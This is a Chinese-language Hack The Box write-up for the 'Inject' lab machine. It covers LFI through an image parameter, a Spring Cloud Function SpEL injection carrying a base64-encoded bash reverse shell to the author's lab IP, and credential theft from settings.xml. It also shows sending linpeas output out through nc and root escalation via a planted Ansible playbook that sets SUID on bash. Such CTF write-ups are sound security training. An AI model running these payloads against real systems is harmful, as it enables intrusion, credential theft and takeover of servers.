---
typora-root-url: ./image
---

## Hack The Box {inject}关卡

Ip地址：

![image-20230603203105184](/:Users:fanhexuan:Library:Application Support:typora-user-images:image-20230603203105184.png)

直接访问IP地址拒绝访问，可能是80端口没开。

kali nmap扫一下：

![image-20230603203746134](/:Users:fanhexuan:Library:Application Support:typora-user-images:image-20230603203746134.png)

发现开了22端口和8080端口。

访问8080端口：

![image-20230603203624481](/:Users:fanhexuan:Library:Application Support:typora-user-images:image-20230603203624481.png)

扫了一圈都是静态页面，不过右上角有个upload，可以上传文件。

![image-20230603203712469](/:Users:fanhexuan:Library:Application Support:typora-user-images:image-20230603203712469.png)

除了图片其他文件都过滤了，不能上传webshell或者.htaccess。但是上传图片后图片名作为Get参数传入后端，就比较有意思了。

```url
http://10.10.11.204:8080/show_image?img=shell.png
```

BP抓包，看一下有没有文件包含（LFI）。

![image-20230603204308169](/:Users:fanhexuan:Library:Application Support:typora-user-images:image-20230603204308169.png)

果不其然，翻一下有没有敏感信息。

除了root还有两个用户。

![image-20230603204423359](/:Users:fanhexuan:Library:Application Support:typora-user-images:image-20230603204423359.png)

再翻一翻，目录下文件不多的话能看就全看完吧，信息收集真的很重要。

这里有一个pom.xml

![image-20230603204712669](/:Users:fanhexuan:Library:Application Support:typora-user-images:image-20230603204712669.png)

解释一下pom.xml是干嘛的：

主要包含了项目的基本信息，可以看到用了项目中都用了哪些组件。

![image-20230603205202807](/:Users:fanhexuan:Library:Application Support:typora-user-images:image-20230603205202807.png)

看上去是web app使用了spring的框架。可以通过查找谷歌来找到可用的漏洞。

![image-20230603210020247](/:Users:fanhexuan:Library:Application Support:typora-user-images:image-20230603210020247.png)

国内也有一篇讲的不错的：https://www.cnblogs.com/9eek/p/16113603.html

具体的利用方式看👆文章。



通过Spring Cloud Rce 反弹shell。

本机瑞士军刀监听9999端口：

![image-20230603210523013](/:Users:fanhexuan:Library:Application Support:typora-user-images:image-20230603210523013.png)

构造Payload：

防止空格分割命令字符串和意想不到的命令解释方式，把payload base64编码一下：

https://bewhale.github.io/tools/encode.html

![image-20230603211406984](/:Users:fanhexuan:Library:Application Support:typora-user-images:image-20230603211406984.png)

```java
T(java.lang.Runtime).getRuntime().exec("bash -c {echo,YmFzaCAtYyAnYmFzaCAtaSA+Ji9kZXYvdGNwLzEwLjEwLjE2LjUvOTk5OSAwPiYxJw==}|{base64,-d}|{bash,-i}")
```

写入**spring.cloud.function.routing-expression**字段，发包即可反弹shell。

![image-20230603210921634](/:Users:fanhexuan:Library:Application Support:typora-user-images:image-20230603210921634.png)

本地收到了反弹过来的shell:

![image-20230603211525530](/:Users:fanhexuan:Library:Application Support:typora-user-images:image-20230603211525530.png)

反弹过来的shell太难用而且还没法自动补全，通过python升级一下shell。



方法如下：

参考：https://www.cnblogs.com/sainet/p/15783539.html

在反向的shell有python的情况下：

```shell
which python
#or 
which python3
```

执行：

```python
python3 -c "import pty; pty.spawn('/bin/bash')"
#这段代码是在Python中使用pty模块创建一个交互式的bash终端。pty.spawn()函数会启动一个新的进程，并将其连接到一个伪终端（pseudo-terminal），然后将标准输入、标准输出和标准错误输出重定向到该伪终端。
#设置环境变量
export SHELL=bash
export TERM=xterm-256color #允许 clear，并且有颜色
```

ctrl+z暂停shell

```shell
stty raw -echo;fg
#键入reset
```

![image-20230603211809743](/:Users:fanhexuan:Library:Application Support:typora-user-images:image-20230603211809743.png)

查找输入frank的文件：

![image-20230603212220456](/:Users:fanhexuan:Library:Application Support:typora-user-images:image-20230603212220456.png)

通过`cat /home/frank/.m2/settings.xml`找到用户phil的密码。

![image-20230603212332261](/:Users:fanhexuan:Library:Application Support:typora-user-images:image-20230603212332261.png)

su切换用户到Phil，拿到第一个flag。

本机启一个python web服务器上传linpeas.sh到靶机：

```shell
#先切换到要上传文件的目录
python3 -m http.server
```

靶机shell使用weget下载文件：

```shell
wget 10.10.16.5:8000/linpeas.sh
```

![image-20230603212911397](/:Users:fanhexuan:Library:Application Support:typora-user-images:image-20230603212911397.png)

运行linpeas.sh 并将结果传到本地：

```shell
#本地
ncat -lvnp 8888 |tee result.txt
```

```shell
#靶机
sh linpeas.sh | nc 10.10.16.5 8888
```

本地使用`less -r result.txt`带颜色阅读结果（也可以在靶机shell上直接用这个命令看，但是太卡）。

![image-20230603214402650](/:Users:fanhexuan:Library:Application Support:typora-user-images:image-20230603214402650.png)

在insteresting中发现playbook，并且是root权限。

![image-20230603213322666](/:Users:fanhexuan:Library:Application Support:typora-user-images:image-20230603213322666.png)

写xml通过python服务器和wget传到靶机。

playbook的路径为**/opt/automation/tasks**，上传到这里会自动运行

```shell
#赋予/bin/bash suid权限，
#s：即运行/bin/bash时被授予程序所有者到权限，也就是root
#u：所有用户都可以通过/bin/bash获得root权限
chomd u+s /bin/bash

```

下载完成

![image-20230603214601584](/:Users:fanhexuan:Library:Application Support:typora-user-images:image-20230603214601584.png)

等待自动运行即可

![image-20230603214656609](/:Users:fanhexuan:Library:Application Support:typora-user-images:image-20230603214656609.png)

![image-20230603214718220](/:Users:fanhexuan:Library:Application Support:typora-user-images:image-20230603214718220.png)

提权成功，拿到system flag。